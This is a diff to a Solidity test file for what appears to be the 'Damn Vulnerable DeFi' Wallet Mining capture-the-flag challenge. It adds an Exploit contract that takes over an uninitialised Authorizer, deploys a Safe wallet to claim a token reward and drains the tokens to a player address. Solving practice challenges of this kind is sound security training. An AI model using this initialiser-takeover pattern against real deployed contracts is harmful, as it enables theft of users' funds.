@@ -225,5 +225,35 @@ contract WalletMiningChallenge is Test {
     }
 }
 contract Exploit {
+    constructor (
+        DamnValuableToken token,
+        AuthorizerUpgradeable authorizer,
+        WalletDeployer walletDeployer,
+        address safe,
+        address ward,
+        bytes memory initializer,
+        uint256 saltNonce,
+        bytes memory txData
+    ) {
+        // Create an array of one element for 'wards', which is this contract
+        address[] memory wards = new address[](1);
+        address[] memory aims = new address [](1);
 
+        // Set the 'ward' to this contract and the 'aim' to the Safe wallet address.
+        wards[0] = address(this);
+        aims[0] = safe;
+
+        // Call init function on the Authorizer contract to set this contract as an authorized address
+        authorizer.init(wards, aims);
+        
+        // Deploy the Safe wallet
+        bool success = walletDeployer.drop(address(safe), initializer, saltNonce);
+        require(success, "Failed to deploy the Safe wallet");
+
+        token.transfer(ward, token.balanceOf(address(this)));
+
+        // Execute the Tx on the Safe wallet
+        (success, ) = safe.call(txData);
+        require(success, "Tx Failed");
+    }
 }
